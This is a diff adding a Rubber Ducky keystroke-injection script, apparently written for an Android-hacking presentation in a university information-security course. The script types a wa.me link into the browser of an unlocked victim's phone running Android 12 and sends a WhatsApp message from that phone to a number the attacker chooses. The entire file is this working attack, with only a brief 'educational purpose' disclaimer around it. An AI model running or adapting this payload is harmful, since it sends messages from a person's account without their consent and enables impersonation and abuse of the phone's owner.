@@ -1,0 +1,112 @@
+REM # -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+REM #  TITLE: Whatsapp Message Sender
+
+?REM #
+
+REM #  This script will send an automatic messsage from victum's phone. 
+
+REM #
+
+REM #  Disclaimer: This script is only for Educational purpose. Please don't misuse it.
+
+REM #
+
+REM #  Tested OS: Android version 12
+
+REM #
+
+REM #  Note: Script won't work on locked devices
+
+REM #
+
+REM #  Date: 08/03/2023
+
+REM # -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+REM #-------------------------------------------------
+
+REM # Below lines will open search engine and type https://
+
+DELAY 1000
+
+GUI r
+
+DELAY 100
+
+STRING h
+
+DELAY 100
+
+STRING t
+
+DELAY 100
+
+STRING t
+
+DELAY 100
+
+STRING p
+
+DELAY 100
+
+STRING s
+
+DELAY 500
+
+DELAY 100
+
+STRING :
+
+DELAY 100
+
+STRING /
+
+DELAY 100
+
+STRING /
+
+DELAY 100
+
+REM #-------------------------------------------------
+
+
+REM #-------------------------------------------------
+
+REM # Below lines will enter wa.me after https://
+
+REM # Replace the mobile number with your's
+
+
+STRING wa.me/
+
+STRING ENTER YOUR MOBILE NUMBER HERE
+
+ENTER
+
+DELAY 5000
+
+REM #-------------------------------------------------
+
+
+REM #-------------------------------------------------
+
+REM # Below message will be sent to the target number confiugured above
+
+REM # this is the raw message with Rubber Ducky
+
+STRING This is the fake message typed with Kali Nethunter and For the presentation of Android hacking and beyond for the subject Information Security (CIS 675)
+
+TAB
+
+TAB
+
+ENTER
+
+DELAY 1000
+
+REM #-------------------------------------------------
+
